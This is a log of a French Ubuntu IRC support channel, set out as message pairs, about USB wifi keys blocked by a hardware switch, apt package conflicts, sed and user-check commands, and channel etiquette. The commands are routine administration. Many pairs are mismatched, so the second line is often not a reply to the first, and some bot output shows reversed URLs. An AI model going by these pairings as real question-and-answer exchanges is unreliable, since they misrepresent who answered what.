comme tu dis	tu peux donner le résultat du apt-cache policy que j'ai donné plus haut ?
tu as donc touché à ton sources.list	certain qu'ils sont actifs par défaut ?
je suis un deb*	https://doc.ubuntu-fr.org/lamp :)
mais la cam intégré à l'ordi peut être connecté via  usb?	bon tu devrais désactiver wlan dans le bios et je vois pas pourquoi ça ferait disparaître la clé de lsusb tu avais peut être désactivé usb
c'est quoi chicony ?	Je ne sais pas
et quand je connecte la clé sur le port, ça ne donne plus rien	elle est toujours dans lsusb ?
avant le journalctl -p4 insère la clé pour voir si elle est bien prise en compte je ne la vois plus	ça s'interrompt tout le temps
ctrl+O ctrl+X pour sortir	justement c'est depuis que j'ai desactivé wlan dans le bios que je ne l'ai plus
http://paste.ubuntu-fr-secours.org/src-148057	veux tu bien effacer la dernière ligne comme précédemment demandé
veux tu bien effacer la dernière ligne comme précédemment demandé	peux-tu me redonner la ligne de commande et je vais noter
journalctl -p4 | cat ?	je te donne lautre resultat http://paste.ubuntu-fr-secours.org/src-148058
cat /etc/network/interfaces	non pas cette commande mais l'autre qui a donné la liste des " activités"?
tu as le bon driver pour la clé maintenant laisse le se lancer	tu peux me redonner la ligne de commande de toutà l'heure?
journalctl -p4	j'ai essayé avec ndiswrapper ...tu verras
iw dev	ça ne donne rien
chercher dans le bios comment désactiver le wifi	 ok
ça a rien donné le truc magique ?	 non
coute rien d'essayer	il me faut absolument désactiver la carte wifi pci pour faire fonctionner la clé wifi?
eee pc	pour moi ça m'a l'air magique mais bon ... http://www.jonathanlinat.net/2014-04-13/wifi-desactive-commutateur-materiel/
pour moi ça m'a l'air magique mais bon ... http://www.jonathanlinat.net/2014-04-13/wifi-desactive-commutateur-materiel/	mais du coup c'est pour faire fonctionner la carte pci wifi ou la clé wifi?
http://paste.ubuntu-fr-secours.org/src-148055	c'est quoi ta machine ? comme modèle ?
quand je connecte la clé, mediatek et atheros visible mais grisé avec wifi désactivé par commutateur matériel	vérifies le wlan0 avec :  iw dev
ou l'inverse	:( ....toujours le même
et donc ?	je connecte la clé et débranche le calbe?
oui et tu relance network	pour confirmation :)
met 0	je mets le tout en fin de ligne?
en donnant la bonne valeur de X	Pour trouver la bonne valeur x il faut faire iwconfig?
sudo nano interfaces	# interfaces(5) file used by ifup(8) and ifdown(8) auto lo iface lo inet loopback
>> quand je vois ca je ne comprend pas tout >> https://github.com/torvalds/linux/commit/dbe08116b87cdc2217f11a78b5b70e29068b7efd	et avec un clavier et souris externe?
j'avais juste eu l'idée en tête de faire fonctionner la  clé wifi ; demander de l'aider pour l'installer dans l'ordi, j'ai fait abstraction à la carte pci	fais un reset du bios et tu récupèrera ta carte pci .. ou enlève là et ta clé marchera immédiatement
fais un reset du bios et tu récupèrera ta carte pci .. ou enlève là et ta clé marchera immédiatement	Je ne sais pas comment enelver la carte, je n'ai jamais ouvert un eee pc de ma vie
une clé wifi peut-elle être fonctionnelle même si la carte wifi pci est presente dans l'ordi?	si tu m'avais donné cette infos au départ j'aurais évité de perdre notre temps à tous les deux.
si tu m'avais donné cette infos au départ j'aurais évité de perdre notre temps à tous les deux.	j'ai déja fait reset du bios et ça n'a rien changé
les deux, le live, et l'install je ne peux pas interagir	déjà c'est la 4.3 wili est en 4.2.0-12
à quoi te sert cette carte ?	mais justement je ne sais pas le faire, autrement j'aurais démonté l'ordi moi même etc.... j'ai acheté la clé wifi pour ne pas à toucher l'ordi , je pensais qu'il suffisait d'installer le driver et la clé marche
mais justement je ne sais pas le faire, autrement j'aurais démonté l'ordi moi même etc.... j'ai acheté la clé wifi pour ne pas à toucher l'ordi , je pensais qu'il suffisait d'installer le driver et la clé marche	ça na rien de difficile
ça na rien de difficile	je suis néophite
ben vus le résultat du ifconfig	je ne savais pas que c'était lié
bonjour car dans mon cas, ce kernel prend en compte mon ordinateur	sur la canal publique, merci!
faire fonctionner la clé wifi	enlève cette carte
enlève cette carte	donc tu dis que la clé wifi ne fonctionne pas tant que la carte pci est presente dans l'ordi?
oups erreur	version live ou version installé qui pose probléme?
nn	Pourquoi tu as besoin du dernier kernel?
que dis ton network indicator ulubuntu ?	Rfkill list me met : hard block : yes
Rfkill list me met : hard block : yes	tu as reseté ton bios ?
tu as reseté ton bios ?	comment faire marcher la clé wifi?
comment faire marcher la clé wifi?	pareil pour le rfkill list ?
pareil pour le rfkill list ?	impossible comme sur windows , même en ayant la carte pci ; j'ai pu faire fonctionner la clé wifi
bravo c'est bien compliqué ces trucs là	il faut enlever la carte pour faire marché la clé ?
oui le problème portait sur la plus récente je me souviens	ça ne donne toujours rien :(
flaf ha oui les deux version openssl	wifi désactivé par commutateur matériel (grisé) et impossible d'utiliser Fn+F2 ( ça ne marche pas)
tu me dis si ça marche ou pas	Il ne se passe rien
Bonjour, Je viens chercher de l'aide. Je voudrais installer Ubuntu 15.10 Beta (4.2 kernel) sur un macbook de 2015 retina (8,1) Mais lors du démarrage je n'est pas de clavier et souris (trackpad) interne. Normalement le dernier kernel aurais du fonctionner mais pas dans mon cas. merci de votre aide	pourquoi veux tu installer une beta?
il ya un mot de passe sur la 14.04.3 en live cd ?	 sudo su
bonjour flaf	probable qu'un reset de bios puisse résoudre ce problème de commutateur matériel
probable qu'un reset de bios puisse résoudre ce problème de commutateur matériel	En fait, je pensais au départ qu'il faillait que je lance RabbitMQ en faisant en sorte qu'il utilise la libssl identique au client (ce que j'ai fait) et ça plantait toujours. Ensuite, j'ai tenté de lancer RabbitMQ sur une Debian Jessie (avec une version libssl pourtant plus ancienne que celle du client) et là ça a marché.
go	en fait le problème n'est pas clairement identifié mais il se situait au niveau d'une lib partagée utilisée par RabbitMQ (mais pas la lib Openssl une autre lib mais j'ignore laquelle exactement).
wifi toujours grisé , wifi désactivé par un commutateur matériel	salut
sudo service network-manager start	je sais pas si tu rappelles du problème de ssl que j'avais...
sudo modprobe -v ath9k	ça ne donne rien
lspci	j'ai oublié de te dire, j'ai installé windows , et le wifi ne fonctionnait pas non plus sur windwos...
j'ai oublié de te dire, j'ai installé windows , et le wifi ne fonctionnait pas non plus sur windwos...	déjà tu as une page rien que pour toi https://doc.ubuntu-fr.org/wifi_atheros_ar9285
déjà tu as une page rien que pour toi https://doc.ubuntu-fr.org/wifi_atheros_ar9285	même sur windows,  wifi ne fonctionne pas, car j'avais déja installé windows je pensais que c'était un probleme de pilote, sur linux
même sur windows,  wifi ne fonctionne pas, car j'avais déja installé windows je pensais que c'était un probleme de pilote, sur linux	alors attend mon go avant de commencer ça va te déconnecter temporairement. Débranche ton cable ethernet...
et pourquoi faire ?	je t'explique : au tout début, j'avais wifi avec ma carte pci ; mais depuis que la personne a demonté mon ordinateur, je ne captait plus rien. J'ai supposé que la personne a mal branché l'antenne ou je ne sais quoi mais depuis je ne pouvais plus utilisé la connexion via wifi. J'ai donc acheté une clé wifi pour ne pas à avoir démonté l'ordinateur à nouveau
je t'explique : au tout début, j'avais wifi avec ma carte pci ; mais depuis que la personne a demonté mon ordinateur, je ne captait plus rien. J'ai supposé que la personne a mal branché l'antenne ou je ne sais quoi mais depuis je ne pouvais plus utilisé la connexion via wifi. J'ai donc acheté une clé wifi pour ne pas à avoir démonté l'ordinateur à nouveau	bon alors enlève ta clef on va faire marcher ta qualcomm
merci d'être précis. la carte pci elle est ou là ?	pci? en fait il y a un moment quelqu'un a démonté l'ordinateur depuis là j'avais un souci avec wifi, ça ne captait plus, donc j'ai supposé que la personne a oublié de bien brancher la carte
mais les deux sont grisé , car indiqué, wifi désactivé par un commutateur	matériel le commutateur ?
matériel le commutateur ?	ou commutateur matériel
elle y était quand tu as installé lubuntu ?	quand je branche la clé wifi , les deux apparaissent : mediatek et atheros
pourquoi la carte pci apparait elle toujours ?	je  ne sais pas
bon avant tu n'avais pas mediatek ? on progresse	je n'avais que athéros AR9485 en pci
tu avais un wifi avant sur cette machine ?	non avant je n'avais pas médiatek
même en rebootant la clé connecté ?	athéros AR8485
le filaire étant prioritaire sur le wifi ... oui	Ça ne donne rien
journalctl -p4	2nd lien résultat complet
2nd lien résultat complet	Tu as débranché ton cable ethernet ?
Tu as débranché ton cable ethernet ?	Non je n'ai pas débranché...il le faut?
uBOTu-fr:	confirmé le 14 septembre : http://askubuntu.com/questions/674116/how-to-install-tp-link-t2uh-wireless-adapter-driver-ralink-mt7610u
confirmé le 14 septembre : http://askubuntu.com/questions/674116/how-to-install-tp-link-t2uh-wireless-adapter-driver-ralink-mt7610u	merci, j'ai reçu un pilote de TP-link et je ne sais comment l'installer
merci, j'ai reçu un pilote de TP-link et je ne sais comment l'installer	suis la procédure du lien
suis la procédure du lien	donc je laisse tomber  le pilote que TP-link m'a envoyé mais je télécharge celui du lien?
Marmotte > le tuto que tu viens de donner date d'il y a peu?	Il date d'un an mais a été réalisé par des utilisateur de la 15.04. apparemment ya pas mieux pour l'instant
confirmé par ces messages http://askubuntu.com/questions/499091/trying-to-install-tp-link-archer-t2u-on-ubuntu	confirmé le 6 novembre 2014, soit il y a 11 mois
comment l'utiliser?	et ça serait 148f:761a Ralink Technology ?
personne?	est ce que tu la vois dans lsusb ?
Après, j'ai une interface graphique -> j'ai fait un clic droit sur le répertoire racine -> propriétés -> permissions -> j'ai mis le user et le groupe qui m'intéressent. Cependant, j'ai l'impression que ce n'est pas récursif :(	il faut remplacer /path/to/dir par le chemin vers ton repertoire
hum... idem... :(	Pour accéder au contenu d'un répertoire il est important que celui ci est le x (d'exécution) correspondant
ah non, c'est que j'ai essayé de l'appliquer à un groupe et non à un user	si tu débutes en Debian, c'est aux salons de support debian qu'il faut s'adresser, le support officiel de debian se passe sur oftc, pas freenode, sinon sur freenode il y a #debianfr et #debian-facile en francais
J'aurais besoin d'une petite aide rapide concernant des droits sur des répertoires... Quelqu'un serait-il dispo svp?	tu peux poser ta question directement
Pourquoi un 'reset' en ligne de commande est il si long ?	tu t'attends à ce que reset fasse quoi ?
cp/m, de l'asmtrad...	meh ?
je peux aussi lancer par le dash mais lui ne me dit pas ou se trouve le lanceur et si c'est le bon	sinon assure toi que le .desktop est executable, et retente avec xdg-open
gtk-launch me renvoie une erreur "pas d'application /home/...etc"	alors passe en mode crado : grep Exec= /path/to/yourfile.desktop | cut -d= -f2 | bash
la production des disquettes 3'5 a été arreté en 2011 … mais je ne vois pas le rapport avec ubuntu	bha maintenant on sait qu'on ne peut installer ubuntu 14.04 avec des disquettes
bha maintenant on sait qu'on ne peut installer ubuntu 14.04 avec des disquettes	on le savait avant
ms-dos 6.0 peut tenir sur une disquette lui	faux, il lui en faut au moins trois
faux, la netinstall tient aussi sur un CD :)	oucéti qu'elle est ?
Tout sur un cd ?	j'ai pas de dvd sous la main, uniquement un cd.
Bonjour, existe t il une version de ubuntu 14.0x gravable sur un cd?	ça fait pas plusieurs années que t'utilises ubuntu ?
ça fait pas plusieurs années que t'utilises ubuntu ?	quel rapport?
Doit y aller là	bon sinon j'ai desactivé les dépots zarbis et j'ai fait sudo apt-get install gconf2=3.2.6-0ubuntu2 .. toujours un probleme: http://pastebin.com/KVSKtmuv
bon sinon j'ai desactivé les dépots zarbis et j'ai fait sudo apt-get install gconf2=3.2.6-0ubuntu2 .. toujours un probleme: http://pastebin.com/KVSKtmuv	sudo apt-get clean
sudo apt-get install gconf2=3.2.6-0ubuntu2	j'ai essayé la commande mais je ne suis pas sure quele ests le PPA , desole. mais j'ai eu un output ..
merci	tu saurais lancer cela avec ton PPA particulier ? awk '$1 == "Package:" { if (a[$2]++ == 0) print $2; }' /var/lib/apt/lists/*PPA-FIRST-PART*PPA-SECOND-PART*Packages
tu as synaptic installé ?	non, j'ai essayé de l'installer mais je ne peux pas grace a mon probleme
dpkg -l gconf2	je ne suis pas sure, apres faire dpkg -l gconf2 j'ai eu : http://pastebin.com/U7wzmNqJ
et aussi un autre qui est webupd8team-sublime-text-2-trusty.list, surement apres installer sublime.	c'est pas lui qui t'aurais ramené cette version de gconf2 ?
@info gconf2	oui, la dedans il y a un fichier que j'ai adjouté
!paste	oui, mon sources.list est : http://pastebin.com/6BMrq0F1
oui, mon sources.list est : http://pastebin.com/6BMrq0F1	dans /etc/apt/sources.list.d/ tu retrouves des dépôts que tu aurais ajouté ?
3.2.6.3 plutôt	est-ce que il y a quelque chose que je peux peut etre enlever et reinstaller?
steran tu es sur quelle version ? as tu ajouté des dépôts récemment ?	je suis sur ubuntu 14.04LTS, 32 bits, c'etait une nouvelle installation
je suis sur ubuntu 14.04LTS, 32 bits, c'etait une nouvelle installation	3.3.6.3 est la version de vivid curieux que tu l'ais ici
déjà vérifie que tu as pas tout cassé : sudo apt-get upgrade	j'ai fait sudo apt-get update et ça passe, j'ai un erreur apres faire sudo apt-get upgrade
Bonjour, j'ai mon systéme cassé et je n'arrive pas à trouver une solution. Quelqu'un pourrais m'aider. Mon message d'erreur est : dpkg-deb : erreur : le sous-processus coller a été tué par le signal (Relais brisé (pipe)) Des erreurs ont été rencontrées pendant l'exécution :  /var/cache/apt/archives/gconf-service_3.2.6-3_i386.deb	quand apparait-il ce message ?
quand apparait-il ce message ?	c'etait aprés faire sudo apt-get -f install
c'etait aprés faire sudo apt-get -f install	ha ben si tu forces les install aussi
mdr	dans ce cas, surveille bien, les retour en arrière arrivent de temps en temps (sur le VPS complet : config et data)
bah tais toi alors	lis plutôt  http://doc.ubuntu-fr.org/conduiteirc comme le suggère le /topic … irc n'est pas segmenté pour faire joli, quand on se pointe sur un salon, c'est mieux de renseigner sur la manière dont il fonctionne
http://www.deezer.com/playlist/1503449	serieux, le bavardage, les liens à la noix, etc … c'est pour #ubuntu-fr-offtopic ; c'est pas pour le salon de support
oui la clé est OK mais pour la faire fonctionner sur fedora 22 c'est autre chose	En plus c'est du velu visiblement : http://forums.fedoraforum.org/showthread.php?t=298892
perso, les seules clés USB Wifi que j'ai ont toujours fonctionné sans aucune manipulation spécifique sous Linux	j'ai une version qui est un peu compliquée à installer
Marmotte> sur internet certains ont réussi à la faire fonctionner. Mais ils n'ont pas detaillé ce qu'ils ont fait	c'est pour ça que je t'ai demandé si tu avais vérifié la compatiblité Linux avant de l'acheter ^^
Marmotte> je l'ai essayé sur windows et la clé fonctionnait très bien	c'est pas parce que ça fonctionne sous Windows que des drivers ont été écrits pour Linux
comment*	c'est quoi le code d'erreur ?
"j'ai un problème" n'est pas un message d'erreur valide ^^	quelles informations il te faut?
donc c'est plutôt normal que personne ne te réponde	je l'ai déja écrit mais surement je ne l'ai pas bien formulé.Mon problème c'est l'activation de ma clé wifi DWA 131 ver E1 sur linux
#fedora-fr	on peut aider à résoudre les problèmes énoncés
et gzip sur le desktop parce que j'imagine qu'il a plus de cpu, et que le réseau n'est pas une limite	c'est plus compliqué que ça malheureusement
je comprends (pourquoi t'as besoin d'un serveur ssh ?	parce que comme ça je peux tout faire de ma machine directement :p
parce que comme ça je peux tout faire de ma machine directement :p	enfin, t'as pas forcément beaucoup de manip à faire sur la machine
merci quand même	note que tu peux jeter un oeil sur https://doc.ubuntu-fr.org/ssd_solid_state_drive#la_commande_trimactivation_et_utilisation (même si c'est pas du ssd, nombre de ce qui est indiqué est pertinent pour une mémoire flash)
note que tu peux jeter un oeil sur https://doc.ubuntu-fr.org/ssd_solid_state_drive#la_commande_trimactivation_et_utilisation (même si c'est pas du ssd, nombre de ce qui est indiqué est pertinent pour une mémoire flash)	c'est gentil mais c'est temporaire, c'est juste pour essayer de sauver le contenu d'un disque mourant
(notamment, tu peux installer des paquets supplémentaires)	rien que l'installation d'openssh-server ne marche pas car si je comprends bien les messages d'erreurs, ils ont bloqués l'upgrade d'un paquet sur lequel dépend openssh-server
parce que j'arrive pas à faire ce que je veux avec le live :'(	c'est quoi les limites que tu as ?
bonjour, j'ai une clé usb qui contient ubuntu 14.04, est ce que je peux installer ubuntu directement sur cette clé ou me faudra t-il forcément une autre clé usb ?	hello. J'ai pas compris exactement ton souci
hello. J'ai pas compris exactement ton souci	sauf que j'ai qu'une clé usb, donc je voudrais installer ubuntu directement sur la clé où est l'iso mais je ne sais pas si c'est possible
depuis des vieux kernels ...	j'avais installé , enfin je crois avoir bien installé un soit disant pilote, mais ...
merci Olaff , je l'ai déja lu ce tuto; mais je ne sais pas comment m'y prendre. Puis je viens d'installer fedora du coup surement ça ne fonctionne pas avec mon système?	#fedora-fr, #fedora
comment je peux me rendre sur le canl fedora STP?	https://askubuntu.com/questions/591016/how-to-install-wireless-adapter-d-link-dwa-131
Ca marche nickel :)	jette un coup d'oeil à "sudo passwd -S BigStalker" ça te donnera plus d'info que le grep
jette un coup d'oeil à "sudo passwd -S BigStalker" ça te donnera plus d'info que le grep	Merci mais j'ai juste besoin de savoir si le user existe ou pas rien de plus :)
(oublié :p)	Tant que j'y suis : En suite je fais un if après qui dit si user existe change passwd elif user existe pas creer user change passwd mais je sais pas comment exprimer un résultat null de grep si user existe pas
Tant que j'y suis : En suite je fais un if après qui dit si user existe change passwd elif user existe pas creer user change passwd mais je sais pas comment exprimer un résultat null de grep si user existe pas	grep -q … retourne un code d'erreur 1 si le motif n'est pas trouvé
Ok merci	|| si le résultat n'est pas trouvé
Je sais que je ne doit poser de question sur le bash ici mais je ne parle pas un seul mot d'anglais. Comment peut on vérifier si un utilisateur existe et placer ce résultat dans une variable ?	c'est le but de && qui enchaine la commande si le résultat est trouvé
allez, c'est dimanche → VAR=$(grep -oP "^BigStalker" /etc/passwd)	Voilà pourquoi. Merci en tous cas
Yop !	si tu sais que tu es HS, pourquoi poser quand même la question
Ici une console s'ouvre et je tape finalement "passwd nomdecompte" puis le mot de passe souhaité	quand as-tu utilisé la machine pour la dernière fois ?
Salut ! Je suis un pure néophyte sur Linux et Ubuntu 14.04 dans mon cas. Je souhaite changer le mot de passe de ma session principale via le mode récupération sur Grub. Mais lorsque je tape mon mot de passe (après avoir entré les commandes adéquates et que la console indique Nouveau mot de passe UNIX) le message "erreur de manipulation du jeton d'authentification" "Mot de passe non changé" apparaît. Que dois-je faire 	tu peux détailler ce que tu fais ?
Un merci à Mezen pour l'install de tor browser	merci mais j'ai rien fait à part te donner le lien à la doc
Mon pb c'est que j'ai télécharger tor browser, que j'ai récupérer le dossier .tar.xz	t'as déjà lu et essayé ce qui est écrit dans la documentation ?
je suis preneur d'un conseil/coup de main ?	quel est ton problème au fait ?
après tout c'est c'est en serveur localhost	dans mon fichier j'ai une ligne : SystemGroup lpadmin
petite demande  daide svp sur lunbuntu si quelqu'un sais comment changer la réso ecran via la commande ctrl-alt-f1 au lancement	 aucune idée
soir	ok :)
je trouve ça pire que prendre les users pour des betatesteurs	<3
mais oui, mint est différent d'ubuntu	récidive :)
   800x600        61.0	t'es muet pour le moment
je précise que je suis sous Mint (mais je crois avoir compris que cela ne changeait pas grand chose)	Utilisez http://paste.ubuntu-fr-secours.org/ pour les copiés/collés, mettez votre pseudonyme dans le champ idoine, merci !
Y'aurait-il quelqu'un pour m'aider sur un problème de driver ?	http://sol.gfxile.net/dontask.html
Chose étrange, c'est qui l'est lors d'une installation via l'ISO	mais pourquoi il te parle de /dev/sda si tu as fait une partition ESP, le message devrait plutot indiquer /dev/sdaX où j'ai loupé un truc ?
mais pourquoi il te parle de /dev/sda si tu as fait une partition ESP, le message devrait plutot indiquer /dev/sdaX où j'ai loupé un truc ?	le problème c'est que la partition EFI qui est censée êe créé par le Preseed, je ne le vois pas
cc Snarf	manque "curlpipesh" dans les alts
bonjour corentin	pour bavarder, merci d'utiliser #ubuntu-fr-offtopic et conserver #ubuntu-fr pour le support
le morvan est un continent	ou dans le morvan ?
Car qd on ajouter toto au groupe machin, il faut fermer la session de toto et en rouvrir une nouvelle pour que ce soit effectif.	Ah d'accord c'est pour ça. Merci !
comment je peux savoir si celui ci est installé ?	tu vas dans les paramètres, dans Sources de logiciels, puis Pilotes additionnels
c'est pas possible	bah si, j ai meme deja fait des ebuilds
enfin, gentoo ca va peut etre un poil hardu aussi, masi au moins ca fonctionera	toi tu as jamais installé gentoo
toi tu as jamais installé gentoo	parceque ton cpu a pas de sse2, et qu il faut faire des manips regulierement pour que ca marche
là, le navigateur maintenant est xxxterm et là ça fonctionne	installe une gentoo ou change de machine, la ca va etre compliqué, surtout pour une gamine
ca vaudrait presque le coup de changer la becane en fait	tu en as d'autres comme ça ?
donc pas de SSE ;)	si sse
et il me redirige vers http://localhost/login	t'as un host qui fait du ssl sur le port 80 ?
piti... pas de connexion externe sans doute les DNS	les routes
je cherche maintenant à fixer l'IP de mon serveur	fais la conf dans /etc/network/interfaces
Les ubunteux, ça va ?	imotep
tout ecrire oui , la libc non bienentendu	https://youtu.be/9CoOtghnBy4 peut être sympa :)
dans une version minimal tout es modifiable ?	tout est modifiable de toute façon
donc ça n'existe pas ?	piti essaie de t'expliquer qu'un OS avec juste un kernel, ça marche pas trop bien :p
car je souhaiterais utiliser juste le "noyau" linux pour des essais asm,c,c++	c'est surtout que ça serait inutilisable
le ubuntu server y'a une difference avec netinstall?	avec "juste le noyau" tu vas avoir sans doute du mal
je comprends	t'as un système 64 bits ou 32 bits ?
oui	puis, je sais pas ce que t'as dans ton /home/utilisateur
Dite moi, je veut insérer une ligne dans un fichier à l'aide de sed, mais il y a des / dans le texte à insérer ce qui pose problème evidemment	on n'aide pas avec le scripting ici :)
ok merci	t'es bien dans la rubrique Etat>Non installés (résidus de configuration) ?
ok j 'ai trouve	oui tu selectionnes tout, puis clique droit: selectionner pour suppression complète
il etait rapide avant	façon facile pour supprimer les résidus de configuration: dans un terminal tu tapes gksudo synaptic
ouvrir une page internet, un document libre office,.... je n'ai rien fais de special	oui...mais était -il rapide pour ouvrir un doc libre office auparavant ?? Car j'imagine que ton ordi n'est pas puissant ou agé vu que tu utilises Lubuntu. Et OpenOffice c'est vraiment un gros machin...
je suis debutante	"très lent" c'est à dire ? pour tout ? as tu installé/fait quelque chose de spécial  ?
merci	tu peux vider les fichiers de configuration des applications/programmes supprimés
et j'ai pas les bonnes réponses (il en manque plein)	je verrais bien ton *.sla qui n'attrape par tous les fichiers (genre .truc)
c'est mon impression	pour le paste, il y a un site ubuntu-machin-truc spécial dédié. On m'avait fait la remarque une fois d'utiliser autre chose que ce site dont j'ai oublié le nom. Mais bon, peu importe.
bonsoir tout seul	:)
vous savez comment je peux donner tous les droits à un utilisateur (moi) sur le dossier /home ?	http://doc.ubuntu-fr.org/permissions
en étant dans la console	tu utilises quoi comme shell?
<mvvvv> nW44b, désolé d'être français :p → comme je te comprends …	le man est la pour etre utilisé (google aussi en passant). car aidé une personne c'est cool mais lui donné la réponse n'est pas l'aidé.
*essayer	désolé d'être français :p .... non mais : https://fr.wikipedia.org/wiki/Variable_m%C3%A9tasyntaxique
sed "27s/^.*$/tout nouveau/" test.txt Gunson	+1
Allez soyez sympa m'obligez pas à vous supplier ^^	sed "5,10s/toto/tutu/" fichier > resultat   pour les lignes 5 à 10
sed "5,10s/toto/tutu/" fichier > resultat   pour les lignes 5 à 10	Désolé en plus j'ai essayé ta commande ^^
une petite parti de la réponse le reste il faut que tu cherche par toi meme	Cela dit merci ça marche mais par contre il ajoute la ligne, c'est quoi l'option pour remplacer la ligne concernée ?
c'est pareil pour toi Marmotte :)	C'est ce que je disais
C'est ce que je disais	c'est parce qu'ils ne connaissent pas la réponse en fait :p
<adeschamps> man sed → heuuuuuu, autant supprimer le chan alors, ou faire une réponse auto du bot : rtfm	j'ai vu que ça en causait dans le man, mais je n'ai jamais fait ça, et je n'ai pas le temps de chercher un exemple précis :)
Pas du tous j'aimerais bien mais malheureusement non ^^	mais oui tu peux ... comme avec ed normalement
Je débute sous Linux pour être franc	http://stackoverflow.com/questions/6537490/insert-a-line-at-specific-line-number-with-sed-or-awk
J'ai beau chercher franchement je trouve rien	tu ne serrais pas en premiere année a epitech?
man sed	Si je suis ici c'est que je suis déjà passé par man, par Google et autres
Si je suis ici c'est que je suis déjà passé par man, par Google et autres	et aussi dans google :)
Style modifier la ligne 27	pourtant, la réponse est dans le man :D
lait	gg
noté	tu peux consulter mezen en privé si tu veux, je scripte beaucoup :)
tu peux consulter mezen en privé si tu veux, je scripte beaucoup :)	bon à savoir :þ
ce qui me dérange c'est le manque de clarté au niveau de la limite offtopic ou pas sur certains sujets. une fois on m'a répondu qu'on pouvait tolérer certains sujets offtopic tant que le canal n'est pas trop sollicité, comme le cas aujourd'hui	ya plus de place au laissé-aller quand c'est inactif ici oui, mais le mieux est de pointer au bon endroit, ça fait moins de "bruit" pour ceux qui check le canal d'un coup d'œil
et si vraiment il n'y a pas d'autres ressources, tu peux toujours essayer l'offtopic #ubuntu-fr-offtopic, ou des canaux généralistes	le libelle du offtopic n'invite pas à la résolution de problème
oui je vois	note que même si j'ai précisé à Zicklr que son sujet n'était pas tellement approprié ici, j'y ai répondu :)
note que même si j'ai précisé à Zicklr que son sujet n'était pas tellement approprié ici, j'y ai répondu :)	oui j'ai vu :)
(qui ne sont pas très nombreux non plus)	les questions sur les clouds par contre, ça reste ici ?
par contre, je signalerai au mec que l'OS n'est pas très utilisé par les Ubunteros français actuellement, et qu'il devrait plutôt jeter un œil chez #ubuntu-mobile	ah ok
surtout que canonical est en train de faire des mobiles avec ubuntu dessus, comment peut on aider si l'on possède pas un smartphone ubuntu	si jamais il y a un jour des questions sur Ubuntu Mobile ici, elles ne seront pas "reconduites à la frontière"
ça commence à déraper comme tu dis sur beaucoup plus de sujets que ce simple Yaml	bah clairement, "mettre en place des tests behats avec mink", ça n'a pas l'air d'être une question sur l'utilisation d'Ubuntu
je souhaite faire un referendum Marmotte	fais le donc, mais pas ici :D
?	https://fr.wikipedia.org/wiki/YAML ?
Comme le chan n'est pas référencé sur la page du site https://www.ubuntu-fr.org/webchat	mettre dans une variable ? genre a=$...
J'ai cherché sur le forum mais sans succès	echo "Ceci est\" un test\" hello world" >> test.sh
tout fonctionne un peu près	exactement ... d'ailleur à cause de ton pseudo je vais aller acheter une brioche :s
Bon... je suis animateur dans la vie et je dois mettre en place une radio pour des momes	je sais pas :D mais normalement il y'en a :D
tu tombe a pic Brioche ... j'ai faim !	je suis prêt à te pardonner si....
je suis prêt à te pardonner si....	désolé ... 2 mois de regime .... j'ai vraimen envie d'une bonne brioche ou d'un bon croissant :P
désolé ... 2 mois de regime .... j'ai vraimen envie d'une bonne brioche ou d'un bon croissant :P	je comprends ... c'était plus dur que toi
coucou les Brioches	y'en a d'autres ?
a t-il autant pour moi	probablement, mais ils ne répondront qu'à des questions précises, pas à des sondages
me dire si ca fonctionne chez vous	essaye ça https://apprtc.appspot.com/r/592939397
Il regarde s'il n'y a pas de "7*" du coup	/etc/os-release
Des basheux dans l'instance ?	oui
D'ailleurs j'en ai profité pour fouiner dans ledit 70-persistant-net.rules et j'ai compris ce qu'il m'a trifouillé aussi :)	j'ai pas compris pourquoi il a fait ca, ces rules udev servent justement à ca ;p
@info firefox vivid	https://github.com/jrabbit/ubotu-fr
https://github.com/jrabbit/ubotu-fr	bien reçu merci
P'tet que c'est uBOTu-fr qui bosse pas le dimanche (d'ailleurs, je propose que uBOTu-fr  réponde "de rien" aux messages "Merci uBOTu-fr" :p )	une bonne raison pour garder fat32 c'est quand tu mettra ta clef sur un windows il se précipitera pas pour te dire qu'il faut la formater.
?	il me semble oui
mais la personne qui a codé le bot l'a fait comme ça	sais tu où on peut voir le code source uBOTu-fr
!wiki partition	lebal_te_diuu/gro.rf-utnubu.cod//:ptth | ksidf/gro.rf-utnubu.cod//:ptth | detrapg/gro.rf-utnubu.cod//:ptth | trapg/gro.rf-utnubu.cod//:ptth | snoititrap/gro.rf-utnubu.cod//:ptth
!wiki gpt	leunam_tnemerffihc/gro.rf-utnubu.cod//:ptth | allizenolc/gro.rf-utnubu.cod//:ptth | 8swodniw_21utnubu_toobitlum/gro.rf-utnubu.cod//:ptth | snoititrap/gro.rf-utnubu.cod//:ptth | tpg/gro.rf-utnubu.cod//:ptth
!wiki gpt	leunam_tnemerffihc/gro.rf-utnubu.cod//:ptth | allizenolc/gro.rf-utnubu.cod//:ptth | 8swodniw_21utnubu_toobitlum/gro.rf-utnubu.cod//:ptth | snoititrap/gro.rf-utnubu.cod//:ptth | tpg/gro.rf-utnubu.cod//:ptth
Salut, pour une clef USB, sur Windows c'est du FAT32, pour linux il vaut mieux quel fs ? (et quel type de table de partition, msdos ou gpt ou... ?). Merci d'avance	ext4 idéalement
@alt osx	Error: Impossible de trouver un ou des equivalent(s) pour ce logiciel, logiciel introuvable, veuillez spécifier le nom exact du logiciel.
@alt red-hat	Error: Impossible de trouver un ou des equivalent(s) pour ce logiciel, logiciel introuvable, veuillez spécifier le nom exact du logiciel.
@alt nesthib	Error: Software not found.
photoshop un o/s ?	l'error (Erreur en français) devrait plutôt renvoyer des propositions approchantes plutôt que ce pavé  ... c'était ma seconde YaKaFoKon ...
@alt windows	Error: Impossible de trouver un ou des equivalent(s) pour ce logiciel, logiciel introuvable. Veuillez ne pas utiliser des espaces, mais plutot des -, par exemple adobe-photoshop
@alt ubuntu-desktop	Error: Impossible de trouver un ou des equivalent(s) pour ce logiciel, logiciel introuvable. Veuillez ne pas utiliser des espaces, mais plutot des -, par exemple adobe-photoshop
@alt ubuntu-dektop	Error: Impossible de trouver un ou des equivalent(s) pour ce logiciel, logiciel introuvable. Veuillez ne pas utiliser des espaces, mais plutot des -, par exemple adobe-photoshop
@alt bluefish	Error: Impossible de trouver un ou des equivalent(s) pour ce logiciel, logiciel introuvable. Veuillez ne pas utiliser des espaces, mais plutot des -, par exemple adobe-photoshop
je debute sur backbox et je voudrai savoir les avantages	tu es sur le channel #ubuntu-fr
@alt dnsmasq | abdoul	Error: You must not give a string containing spaces as an argument.
